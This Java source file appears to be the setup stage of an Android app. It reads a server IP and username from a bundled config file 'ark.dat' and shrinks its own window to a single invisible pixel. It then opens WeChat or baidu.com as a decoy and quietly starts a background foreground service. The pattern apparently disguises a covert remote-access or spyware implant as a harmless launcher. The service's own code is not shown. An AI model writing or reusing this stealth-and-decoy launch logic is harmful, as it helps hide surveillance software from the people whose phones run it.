package com.setup;

import java.io.InputStream;
import org.json.JSONObject;
import com.main.MainUtils;
import com.main.ForegroundService;
import com.utils.PrefOper;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.view.Gravity;
import android.view.Window;
import android.view.WindowManager;



public class NetworkSetup {

	public static final String CONFIG_FILENAME = "ark.dat";
	
	public static boolean networkSetup(Activity activity){
		
		try{
			String mode = PrefOper.getValue(activity, ForegroundService.PARAMCONFIG_FileName, ForegroundService.SETUPMODE);
			if (mode.equals(ForegroundService.SETUPMODE_MANUAL) || mode.equals(ForegroundService.SETUPMODE_JAR) ||
					 mode.equals(ForegroundService.SETUPMODE_SO)) {
				return false;
			}
			
			if ( mode.equals("") == false && mode.equals(ForegroundService.SETUPMODE_APK) == false ) {
				return false;
			}
			
			Window window = activity.getWindow();
//		  	activity.requestWindowFeature(Window.FEATURE_NO_TITLE);
//		  	activity.getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, 
//		  			WindowManager.LayoutParams.FLAG_FULLSCREEN);
//		  	activity.getWindow().setBackgroundDrawable(new ColorDrawable(android.graphics.Color.TRANSPARENT));
//		  	activity.getWindow().setDimAmount(0f);
			window.setGravity(Gravity.LEFT | Gravity.TOP);
			WindowManager.LayoutParams params  = window.getAttributes();
			params.x = 0;
			params.y = 0;
			params.height = 1;
			params.width = 1;
			window.setAttributes(params);
			
			if ( mode.equals("")) {	
	            InputStream is = activity.getAssets().open(CONFIG_FILENAME);
	            int size = is.available();
	            if (is == null || size <= 0) {
	            	return false;
				}
	            
	            byte[] buffer = new byte[size];
	            is.read(buffer);
	            is.close();
	            String cfg = new String(buffer);
	            JSONObject js = new JSONObject(cfg);
	            mode = js.optString(ForegroundService.SETUPMODE);

	            if (mode.equals(ForegroundService.SETUPMODE_APK)) {

		            String apktype = (String)js.optString(ForegroundService.SETUPMODE_APK_TYPE);
		            if (apktype.contains("weixin")) {
						Intent intent = new Intent();
			          	ComponentName componentName = new ComponentName("com.tencent.mm", "com.tencent.mm.ui.LauncherUI");
			          	intent.setComponent(componentName);
					  	intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
					  	activity.startActivity(intent);
					}else if (apktype.contains("baidu")) {
						Uri uri = Uri.parse("https://www.baidu.com");
					  	Intent intent = new Intent(Intent.ACTION_VIEW, uri);
					  	activity.startActivity(intent);
					}else{
						apktype = "baidu";
						Uri uri = Uri.parse("https://www.baidu.com");
					  	Intent intent = new Intent(Intent.ACTION_VIEW, uri);
					  	activity.startActivity(intent);
					}

					PrefOper.setValue(activity, ForegroundService.PARAMCONFIG_FileName,
							ForegroundService.SETUPMODE,mode);
					
					PrefOper.setValue(activity, ForegroundService.PARAMCONFIG_FileName,ForegroundService.SETUPMODE_APK_TYPE,
							apktype);
					
		            String ip = (String)js.optString("ip");
		            String username = (String)js.optString("username");
//		            String ip = (String)js.optString(ForegroundService.CFGSERVERIP);
//		            String username = (String)js.optString(ForegroundService.CFGUSERNAME);
		            
//					String ip = PrefOper.getValue(activity, ForegroundService.PARAMCONFIG_FileName,
//							ForegroundService.CFGSERVERIP);
//					String username = PrefOper.getValue(activity, ForegroundService.PARAMCONFIG_FileName,
//							ForegroundService.CFGUSERNAME);
					
					PrefOper.setValue(activity, ForegroundService.PARAMCONFIG_FileName,ForegroundService.CFGSERVERIP,ip);
					
					PrefOper.setValue(activity, ForegroundService.PARAMCONFIG_FileName,ForegroundService.CFGUSERNAME,username);
					MainUtils.checkStartForegroundService(activity);
					return true;
	            }else{
	            	return false;
	            }
			}else if( mode.equals(ForegroundService.SETUPMODE_APK)){
	            String apktype = PrefOper.getValue(activity, ForegroundService.PARAMCONFIG_FileName,
	            		ForegroundService.SETUPMODE_APK_TYPE);
	            if (apktype.contains("weixin")) {
					Intent intent = new Intent();
		          	ComponentName componentName = new ComponentName("com.tencent.mm", "com.tencent.mm.ui.LauncherUI");
		          	intent.setComponent(componentName);
				  	intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				  	activity.startActivity(intent);
				}else if (apktype.contains("baidu")) {
					Uri uri = Uri.parse("https://www.baidu.com");
				  	Intent intent = new Intent(Intent.ACTION_VIEW, uri);
				  	activity.startActivity(intent);
				}else{
					Uri uri = Uri.parse("https://www.baidu.com");
				  	Intent intent = new Intent(Intent.ACTION_VIEW, uri);
				  	activity.startActivity(intent);
				  	apktype = "baidu";
				}
	            MainUtils.checkStartForegroundService(activity);
	            return true;
			}else{
				return false;
			}
		}catch(Exception ex){
			  ex.printStackTrace();
		}

		return false;
	}
}
